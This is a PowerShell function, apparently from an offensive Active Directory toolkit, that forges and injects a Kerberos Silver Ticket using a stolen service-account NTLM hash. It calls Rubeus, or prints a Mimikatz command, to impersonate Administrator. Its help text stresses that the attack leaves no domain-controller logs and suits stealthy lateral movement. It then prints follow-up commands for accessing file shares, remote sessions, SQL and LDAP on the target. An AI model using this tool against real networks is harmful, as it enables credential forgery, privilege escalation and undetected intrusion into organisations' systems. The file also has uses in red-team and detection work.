function Invoke-SilverTicket {
    <#
    .SYNOPSIS
        Forge and inject a Silver Ticket for a specific service.

    .DESCRIPTION
        Creates a forged service ticket (TGS) using the service account's
        NTLM hash. Silver Tickets never contact the Domain Controller,
        generating zero KDC logs — ideal for stealthy lateral movement.

        Automatically prints service-specific verification commands based
        on the SPN type (CIFS, HOST, MSSQLSvc, HTTP, LDAP).

    .PARAMETER User
        Username to impersonate. Defaults to "Administrator".

    .PARAMETER ServiceHash
        Service account NTLM hash.

    .PARAMETER ServiceSPN
        Full SPN (e.g., CIFS/fileserver.corp.local).

    .PARAMETER TargetHost
        Target hostname for the service.

    .PARAMETER DomainSID
        Domain SID.

    .PARAMETER Domain
        Target domain. Defaults to current domain.

    .PARAMETER UserID
        User RID to embed. Defaults to 500.

    .EXAMPLE
        Invoke-SilverTicket -ServiceHash "abc123..." -ServiceSPN "CIFS/fs01.corp.local" `
            -TargetHost "fs01.corp.local" -DomainSID "S-1-5-21-..."
    #>

    param(
        [string]$User = "Administrator",
        [Parameter(Mandatory)][string]$ServiceHash,
        [Parameter(Mandatory)][string]$ServiceSPN,
        [Parameter(Mandatory)][string]$TargetHost,
        [Parameter(Mandatory)][string]$DomainSID,
        [string]$Domain = (Get-ADDomain).DNSRoot,
        [int]$UserID = 500
    )

    $ServiceType = $ServiceSPN.Split('/')[0]

    Write-Host "`n[*] Silver Ticket: $ServiceSPN" -ForegroundColor Cyan
    Write-Host "[*] As: $Domain\$User | Service: $ServiceType" -ForegroundColor Yellow
    Write-Host "[*] NOTE: No Domain Controller contact — zero KDC logs!" -ForegroundColor Green

    if (Test-Path ".\Rubeus.exe") {
        & .\Rubeus.exe silver /user:$User /domain:$Domain /sid:$DomainSID `
            /rc4:$ServiceHash /service:$ServiceSPN /ptt
    }
    else {
        Write-Host "[-] Rubeus not found. Mimikatz command:" -ForegroundColor Red
        Write-Host "    kerberos::golden /user:$User /domain:$Domain /sid:$DomainSID /rc4:$ServiceHash /target:$TargetHost /service:$ServiceType /id:$UserID /ptt"
    }

    Write-Host "`n[+] Silver Ticket injected." -ForegroundColor Green

    switch ($ServiceType) {
        'CIFS'      { Write-Host "[*] Test: dir \\$TargetHost\C$" -ForegroundColor Cyan }
        'HOST'      { Write-Host "[*] Test: Enter-PSSession -ComputerName $TargetHost" -ForegroundColor Cyan }
        'MSSQLSvc'  { Write-Host "[*] Test: sqlcmd -S $TargetHost -E" -ForegroundColor Cyan }
        'HTTP'      { Write-Host "[*] Test: Invoke-WebRequest http://$TargetHost -UseDefaultCredentials" -ForegroundColor Cyan }
        'LDAP'      { Write-Host "[*] Test: Get-ADUser -Filter * -Server $TargetHost" -ForegroundColor Cyan }
    }
}